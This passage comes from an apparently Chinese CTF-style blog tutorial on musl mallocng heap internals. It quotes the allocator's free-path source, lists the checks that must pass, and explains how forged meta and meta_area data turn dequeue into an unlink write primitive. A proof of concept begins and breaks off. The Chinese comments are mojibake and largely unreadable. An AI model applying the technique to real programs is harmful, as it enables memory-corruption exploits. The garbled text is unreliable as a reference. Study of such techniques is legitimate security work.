class="type">unsigned</span> <span class="type">char</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line">    assert(!((<span class="type">uintptr_t</span>)p &amp; <span class="number">15</span>));</span><br><span class="line">    <span class="type">int</span> offset = *(<span class="type">const</span> <span class="type">uint16_t</span> *)(p - <span class="number">2</span>);<span class="comment">// å¾—åˆ°chunk offset</span></span><br><span class="line">    <span class="type">int</span> index = p[<span class="number">-3</span>] &amp; <span class="number">31</span>;;<span class="comment">// å¾—åˆ°chunk idx</span></span><br><span class="line">    <span class="keyword">if</span> (p[<span class="number">-4</span>]) &#123;</span><br><span class="line">        assert(!offset);</span><br><span class="line">        offset = *(<span class="type">uint32_t</span> *)(p - <span class="number">8</span>);</span><br><span class="line">        assert(offset &gt; <span class="number">0xffff</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">base</span> =</span> (<span class="type">const</span> <span class="type">void</span> *)(p - UNIT*offset - UNIT);<span class="comment">// é€šè¿‡offset å’Œchunk åœ°å€è®¡ç®—å‡ºgroupåœ°å€</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span> =</span> base-&gt;meta;<span class="comment">// ä»group å¾—åˆ° meta åœ°å€</span></span><br><span class="line">    assert(meta-&gt;mem == base);<span class="comment">// æ£€æŸ¥meta æ˜¯å¦æŒ‡å‘å¯¹åº”çš„group</span></span><br><span class="line">    assert(index &lt;= meta-&gt;last_idx);<span class="comment">// æ£€æŸ¥chunk idx æ˜¯å¦è¶…è¿‡ meta æœ€å¤§chunk å®¹é‡</span></span><br><span class="line">    assert(!(meta-&gt;avail_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line">    assert(!(meta-&gt;freed_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">area</span> =</span> (<span class="type">void</span> *)((<span class="type">uintptr_t</span>)meta &amp; <span class="number">-4096</span>);<span class="comment">// å¾—åˆ°meta_area åœ°å€</span></span><br><span class="line">    assert(area-&gt;check == ctx.secret);<span class="comment">// æ£€æŸ¥ check æ ¡éªŒå€¼</span></span><br><span class="line">    <span class="keyword">if</span> (meta-&gt;sizeclass &lt; <span class="number">48</span>) &#123; <span class="comment">// å¦‚æœå±äº sizeclasses ç®¡ç†çš„chunk å¤§å°</span></span><br><span class="line">        assert(offset &gt;= size_classes[meta-&gt;sizeclass]*index);</span><br><span class="line">        assert(offset &lt; size_classes[meta-&gt;sizeclass]*(index+<span class="number">1</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        assert(meta-&gt;sizeclass == <span class="number">63</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (meta-&gt;maplen) &#123;</span><br><span class="line">        assert(offset &lt;= meta-&gt;maplen*<span class="number">4096UL</span>/UNIT - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">struct</span> meta *)meta;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="nontrivial-free"><a href="#nontrivial-free" class="headerlink" title="nontrivial_free:"></a>nontrivial_free:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> mapinfo <span class="title function_">nontrivial_free</span><span class="params">(<span class="keyword">struct</span> meta *g, <span class="type">int</span> i)</span><span class="comment">// i = idx</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;i;</span><br><span class="line">    <span class="type">int</span> sc = g-&gt;sizeclass;</span><br><span class="line">    <span class="type">uint32_t</span> mask = g-&gt;freed_mask | g-&gt;avail_mask;<span class="comment">//mask=å·²ç»è¢«freeçš„chunk +å¯ä½¿ç”¨çš„chunk</span></span><br><span class="line">    <span class="keyword">if</span> (mask+self == (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span> &amp;&amp; okay_to_free(g))</span><br><span class="line">    &#123;    <span class="comment">/*    </span></span><br><span class="line"><span class="comment">         å¦‚æœ mask+self == (2u&lt;&lt;g-&gt;last_idx)-1 ä»£è¡¨æ­¤metaä¸­groupé‡Œçš„chunk éƒ½è¢«é‡Šæ”¾ æˆ–è€… éƒ½è¢«ç”¨äº†</span></span><br><span class="line"><span class="comment">         (2u&lt;&lt;g-&gt;last_idx)-1 è®¡ç®—å‡ºçš„å€¼åŒ–æˆäºŒè¿›åˆ¶ï¼Œå…¶ä¸­æ¯ä½å«ä¹‰ç±»ä¼¼äºbitmapï¼Œå¦‚æœæ¯ä½ä¸º1è¡¨æ¯ä½è¦ä¸æ˜¯è¢«free ä¸ç„¶å°±æ˜¯è¢«</span></span><br><span class="line"><span class="comment">         okay_to_free æ£€æµ‹æ˜¯å¦å¯ä»¥è¢«é‡Šæ”¾</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">if</span> (g-&gt;next)</span><br><span class="line">        &#123;    <span class="comment">// å¦‚æœé˜Ÿåˆ—ä¸­ æœ‰ä¸‹ä¸€ä¸ªmeta</span></span><br><span class="line">            assert(sc &lt; <span class="number">48</span>);<span class="comment">// æ£€æµ‹ sc æ˜¯ä¸æ˜¯mmap åˆ†é…çš„</span></span><br><span class="line">      <span class="comment">// æ£€æµ‹å½“å‰meta g å’Œ é˜Ÿåˆ—é‡Œçš„active[sc] meta æ˜¯å¦ä¸€æ ·ï¼Œä¸€æ ·åˆ™activate_newèµ‹å€¼ä¸º1</span></span><br><span class="line">            <span class="type">int</span> activate_new = (ctx.active[sc]==g);</span><br><span class="line">            dequeue(&amp;ctx.active[sc], g);<span class="comment">// å½“å‰meta å‡ºé˜Ÿ</span></span><br><span class="line"> </span><br><span class="line">            <span class="comment">// åœ¨å‡ºé˜Ÿæ“ä½œå ,ctx.active[sc]==meta -&gt;next  æ˜¯æŒ‡çš„åˆšåˆšå‡ºé˜Ÿmeta çš„ä¸‹ä¸€ä¸ªmeta</span></span><br><span class="line">            <span class="keyword">if</span> (activate_new &amp;&amp; ctx.active[sc])</span><br><span class="line">                activate_group(ctx.active[sc]);<span class="comment">//å¦‚æœæœ‰ä¸‹ä¸€ä¸ªmeta ç›´æ¥æ¿€æ´» ç„¶åä¿®æ”¹avail_mask æ ‡å¿—ä½</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> free_group(g);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!mask)</span><br><span class="line">    &#123;<span class="comment">// mask==0 group chunk ç©ºé—´å·²è¢«å®Œå…¨ä½¿ç”¨</span></span><br><span class="line">        assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">        <span class="comment">// might still be active if there were no allocations</span></span><br><span class="line">        <span class="comment">// after last available slot was taken.</span></span><br><span class="line">        <span class="keyword">if</span> (ctx.active[sc] != g) &#123;<span class="comment">// å¦‚æœ g æœªè¢«åŠ å…¥ é˜Ÿåˆ—ctx.ative[sc]</span></span><br><span class="line">            <span class="built_in">queue</span>(&amp;ctx.active[sc], g);<span class="comment">// æŠŠg åŠ å…¥é˜Ÿåˆ—</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    a_or(&amp;g-&gt;freed_mask, self);<span class="comment">// ä¿®æ”¹å¯¹åº” çš„freed_mask æ ‡å¿— ï¼Œè¡¨ç¤ºç€å¯¹åº”çš„chunk å·²è¢«é‡Šæ”¾</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">struct</span> mapinfo)&#123; <span class="number">0</span> &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="dequeue"><a href="#dequeue" class="headerlink" title="dequeue:"></a>dequeue:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">dequeue</span><span class="params">(<span class="keyword">struct</span> meta **phead, <span class="keyword">struct</span> meta *m)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (m-&gt;next != m) &#123;</span><br><span class="line">        m-&gt;prev-&gt;next = m-&gt;next; <span class="comment">// è¿™é‡Œå­˜åœ¨æŒ‡é’ˆäº’å†™ åœ¨ prev æ‰€æŒ‡åœ°å€ä¸Š å†™å…¥next æŒ‡é’ˆ</span></span><br><span class="line">        m-&gt;next-&gt;prev = m-&gt;prev; <span class="comment">// åœ¨next æ‰€æŒ‡åœ°å€ä¸Š å†™å…¥prev æŒ‡é’ˆ</span></span><br><span class="line">        <span class="keyword">if</span> (*phead == m) *phead = m-&gt;next;<span class="comment">// é˜Ÿåˆ—å¤´å¦‚æœä¸ºm é‚£å°±æ›´æ–°ä¸ºm-&gt;next</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        *phead = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    m-&gt;prev = m-&gt;next = <span class="number">0</span>; <span class="comment">// æ¸…ç†m(meta)çš„å¤´å°¾æŒ‡é’ˆ</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="dequeueè§¦å‘æ¡ä»¶"><a href="#dequeueè§¦å‘æ¡ä»¶" class="headerlink" title="dequeueè§¦å‘æ¡ä»¶"></a>dequeueè§¦å‘æ¡ä»¶</h3><p>1ã€<code>avail_mask</code> è¡¨ç¤ºåªæœ‰ä¸€ä¸ª<code>chunk</code> è¢«ä½¿ç”¨ ,<code>freed_mask=0</code>ï¼Œè€Œ<code>free</code> åˆšå¥½è¦<code>free</code> ä¸€ä¸ª<code>chunk</code>ï¼Œæ»¡è¶³ <code>okay_to_free()</code> æ¡ä»¶ å°±å¯ä»¥è¿›å…¥<code>dequeue</code> è¿›è¡Œå‡ºé˜Ÿæ“ä½œ<br>å¦‚<code>add(1,0x20)</code> å†<code>free(1)</code> å°±ä¼šä½¿å¾—<code>meta</code> è¢«å›æ”¶<br>2ã€<code>avail_mask=0</code>, <code>freed_mask</code> è¡¨ç¤ºåªæœ‰ <code>1</code>ä¸ª <code>chunk</code> æ²¡è¢«é‡Šæ”¾ï¼Œè¿™æ—¶é‡Šæ”¾çš„<code>chunk</code> å°±åº”è¯¥æ˜¯é‚£æœ€åä¸€ä¸ª<code>chunk</code><br>å¦‚ä¸‹é¢æƒ…å†µ <code>avail_mask ==0 free_mask=63=00111111 last_idx = 6</code>ï¼Œå·²ç»é‡Šæ”¾<code>6</code> ä¸ª<code>chunk</code> è¿˜æœ‰æœ€åä¸€ä¸ª<code>chunk</code>æ²¡è¢«é‡Šæ”¾ åœ¨é‡Šæ”¾æœ€åä¸€ä¸ª<code>chunk</code> æ—¶ä¼šè§¦å‘<code>dequeue</code>ä½¿å¾—å¯¹åº”<code>meta</code>å‡ºé˜Ÿ<br>3ã€å¦‚æœå‘ç°è¿™ä¸ª<code>group</code>ä¸­æ‰€æœ‰çš„<code>chunk</code>è¦ä¹ˆè¢«<code>free</code>, è¦ä¹ˆæ˜¯å¯ç”¨çš„, é‚£ä¹ˆå°±ä¼šå›æ”¶æ‰è¿™ä¸ª<code>group</code>ï¼Œè°ƒç”¨<code>dequeue</code>ä»é˜Ÿåˆ—ä¸­å‡ºé˜Ÿ</p><h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><p>free é¦–å…ˆä¼šè°ƒç”¨ <code>get_meta</code> ï¼Œè€Œ <code>get_meta</code> æœ‰å¦‚ä¸‹æ£€æŸ¥:</p><ul><li><code>assert(!((uintptr_t) p &amp; 15));</code>ï¼Œå³ <code>chunk</code> åº”è¯¥å…³äº <code>0x10</code> å¯¹é½</li><li><code>meta-&gt;mem == base</code> ï¼Œå³ <code>meta</code> ä¸­ä¿å­˜çš„ <code>group</code> æŒ‡é’ˆè¦æ­£ç¡®</li><li><code>index &lt;= meta-&gt;last_idx</code> ï¼Œå³ <code>chunk</code> çš„ç´¢å¼•ä¸èƒ½è¶Šç•Œ</li><li><code>assert(!(meta-&gt;avail_mask &amp; (1u &lt;&lt; index)));</code> ï¼Œ<code>assert(!(meta-&gt;freed_mask &amp; (1u &lt;&lt; index)));</code> ï¼Œæ£€æµ‹ <code>double fre</code></li><li><code>area-&gt;check == ctx.secret</code> ï¼Œå³ <code>meta</code> æ‰€åœ¨çš„ <code>meta_area</code> çš„æ ¡éªŒå€¼æ­£ç¡®ã€‚å¦‚æœä¼ªé€ çš„ <code>meta</code> ä½äºä¸€ä¸ªä¼ªé€ çš„ <code>meta_area</code> ä¸­ï¼Œéœ€è¦é¦–å…ˆè·å–æ ¡éªŒå€¼ <code>secret</code> å¹¶ä¿å­˜åˆ° <code>meta_area</code> å¼€å¤´ï¼Œå³è¿™ä¸€é¡µæœ€å¼€å§‹çš„åœ°æ–¹</li><li><code>offset &gt;= size_classes[meta-&gt;sizeclass]_index ï¼Œoffset &lt; size_classes[meta-&gt;sizeclass]_(index+1)</code> ï¼Œè¿™ä¸¤ä¸ªæ£€æŸ¥ <code>offset</code> å’Œ <code>chunk</code> å¤§å°æ˜¯å¦å¯¹åº”</li><li><code>assert(offset &lt;= meta-&gt;maplen*4096UL/UNIT - 1);</code> ï¼Œå³æ£€æŸ¥ <code>offset</code> æ˜¯å¦è¶Šç•Œ</li></ul><p>ç´§æ¥ç€è¿˜ä¼šè°ƒç”¨ <code>get_nominal_size</code>ï¼Œå…¶ä¸­æœ‰å¯¹ <code>chunk</code> çš„æ£€æŸ¥ï¼Œæ€»ç»“æ¥è¯´ <code>chunk</code> åŒºåŸŸå°½é‡éƒ½å¡« <code>0</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">size_t</span> <span class="title function_">get_nominal_size</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *p, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *end)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> reserved = p[<span class="number">-3</span>] &gt;&gt; <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">if</span> (reserved &gt;= <span class="number">5</span>) &#123;</span><br><span class="line">        assert(reserved == <span class="number">5</span>);</span><br><span class="line">        reserved = *(<span class="type">const</span> <span class="type">uint32_t</span> *) (end - <span class="number">4</span>);</span><br><span class="line">        assert(reserved &gt;= <span class="number">5</span>);</span><br><span class="line">        assert(!end[<span class="number">-5</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    assert(reserved &lt;= end - p);</span><br><span class="line">    assert(!*(end - reserved));</span><br><span class="line">    <span class="comment">// also check the slot&#x27;s overflow byte</span></span><br><span class="line">    assert(!*end);</span><br><span class="line">    <span class="keyword">return</span> end - reserved - p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹‹ååœ¨ <code>free</code> ä¸­çš„å¾ªç¯æ»¡è¶³æ¡ä»¶è·³å‡ºå¾ªç¯è°ƒç”¨ <code>nontrivial_free</code> å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="type">uint32_t</span> freed = g-&gt;freed_mask;</span><br><span class="line">    <span class="type">uint32_t</span> avail = g-&gt;avail_mask;</span><br><span class="line">    <span class="type">uint32_t</span> mask = freed | avail;</span><br><span class="line">    assert(!(mask &amp; self));</span><br><span class="line">    <span class="keyword">if</span> (!freed || mask + self == all) <span class="keyword">break</span>;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">wrlock();</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> nontrivial_free(g, idx);</span><br></pre></td></tr></table></figure><p>è¿›å…¥ <code>nontrivial_free</code> å‡½æ•°åä¼šæ‰§è¡Œå¦‚ä¸‹ä»£ç ã€‚<code>okay_to_free</code> å‡½æ•°è¿”å›é <code>0</code> çš„å‰ææ˜¯ <code>meta-&gt;freeable</code> é <code>0</code>ï¼Œå¦å¤–è¿˜è¦ç¡®ä¿ <code>meta-&gt;sizeclass &lt; 48</code> ã€‚ä¹‹åè°ƒç”¨ <code>dequeue</code> å‡½æ•°è§¦å‘ <code>unlink</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint32_t</span> self = <span class="number">1u</span> &lt;&lt; i;</span><br><span class="line"><span class="type">int</span> sc = g-&gt;sizeclass;</span><br><span class="line"><span class="type">uint32_t</span> mask = g-&gt;freed_mask | g-&gt;avail_mask;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (mask + self == (<span class="number">2u</span> &lt;&lt; g-&gt;last_idx) - <span class="number">1</span> &amp;&amp; okay_to_free(g)) &#123;</span><br><span class="line">    <span class="comment">// any multi-slot group is necessarily on an active list</span></span><br><span class="line">    <span class="comment">// here, but single-slot groups might or might not be.</span></span><br><span class="line">    <span class="keyword">if</span> (g-&gt;next) &#123;</span><br><span class="line">        assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">        <span class="type">int</span> activate_new = (ctx.active[sc] == g);</span><br><span class="line">        dequeue(&amp;ctx.active[sc], g);</span><br><span class="line">        <span class="keyword">if</span> (activate_new &amp;&amp; ctx.active[sc])</span><br><span class="line">            activate_group(ctx.active[sc]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> free_group(g);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>ä¹‹åè¿›å…¥ <code>free_group</code> å‡½æ•°åä¸ºäº†å‡å°ä¼ªé€ éš¾åº¦ä¸å†è°ƒç”¨ <code>nontrivial_free</code> è¦ä¿è¯ <code>maplen</code> ä¸ä¸ºé›¶</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> mapinfo <span class="title function_">free_group</span><span class="params">(<span class="keyword">struct</span> meta *g)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> sc = g-&gt;sizeclass;</span><br><span class="line">    <span class="keyword">if</span> (sc &lt; <span class="number">48</span>) &#123;</span><br><span class="line">        ctx.usage_by_class[sc] -= g-&gt;last_idx + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (g-&gt;maplen) &#123;</span><br><span class="line">        step_seq();</span><br><span class="line">        record_seq(sc);</span><br><span class="line">        mi.base = g-&gt;mem;</span><br><span class="line">        mi.len = g-&gt;maplen * <span class="number">4096UL</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">void</span> *p = g-&gt;mem;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span> =</span> get_meta(p);</span><br><span class="line">        <span class="type">int</span> idx = get_slot_index(p);</span><br><span class="line">        g-&gt;mem-&gt;meta = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// not checking size/reserved here; it&#x27;s intentionally invalid</span></span><br><span class="line">        mi = nontrivial_free(m, idx);</span><br><span class="line">    &#125;</span><br><span class="line">    free_meta(g);</span><br><span class="line">    <span class="keyword">return</span> mi;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>poc:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNIT 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IB 4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FAKE_CHUNK_SIZE 0x80</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FAKE_CHUNK_INDEX 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LAST_INDEX 4</span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">uint16_t</span> size_classes[] = &#123;</span><br><span class="line">        <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>,</span><br><span class="line">        <span class="number">9</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">15</span>,</span><br><span class="line">        <span class="number">18</span>, <span class="number">20</span>, <span class="number">25</span>, <span class="number">31</span>,</span><br><span class="line">        <span class="number">36</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">63</span>,</span><br><span class="line">        <span class="number">72</span>, <span class="number">84</span>, <span class="number">102</span>, <span class="number">127</span>,</span><br><span class="line">        <span class="number">146</span>, <span class="number">170</span>, <span class="number">204</span>, <span class="number">255</span>,</span><br><span class="line">        <span class="number">292</span>, <span class="number">340</span>, <span class="number">409</span>, <span class="number">511</span>,</span><br><span class="line">        <span class="number">584</span>, <span class="number">682</span>, <span class="number">818</span>, <span class="number">1023</span>,</span><br><span class="line">        <span class="number">1169</span>, <span class="number">1364</span>, <span class="number">1637</span>, <span class="number">2047</span>,</span><br><span class="line">        <span class="number">2340</span>, <span class="number">2730</span>, <span class="number">3276</span>, <span class="number">4095</span>,</span><br><span class="line">        <span class="number">4680</span>, <span class="number">5460</span>, <span class="number">6552</span>, <span class="number">8191</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">size_to_class</span><span class="params">(<span class="type">size_t</span> n)</span> &#123;</span><br><span class="line">    n = (n + IB - <span class="number">1</span>) &gt;&gt; <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> (n &lt; <span class="number">10</span>) <span class="keyword">return</span> n;</span><br><span class="line">    n++;</span><br><span class="line">    <span class="type">int</span> i = (<span class="number">28</span> - __builtin_ctz(n)) * <span class="number">4</span> + <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; size_classes[i + <span class="number">1</span>]) i += <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; size_classes[i]) i++;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_context</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> secret;</span><br><span class="line">    <span class="type">int</span> init_done;</span><br><span class="line">    <span class="type">unsigned</span> mmap_counter;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">free_meta_head</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">avail_meta</span>;</span></span><br><span class="line">    <span class="type">size_t</span> avail_meta_count, avail_meta_area_count, meta_alloc_shift;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">meta_area_head</span>, *<span class="title">meta_area_tail</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *avail_meta_areas;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">active</span>[48];</span></span><br><span class="line">    <span class="type">size_t</span> usage_by_class[<span class="number">48</span>];</span><br><span class="line">    <span class="type">uint8_t</span> unmap_seq[<span class="number">32</span>], bounces[<span class="number">32</span>];</span><br><span class="line">    <span class="type">uint8_t</span> seq;</span><br><span class="line">    <span class="type">uintptr_t</span> brk;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> active_idx: <span 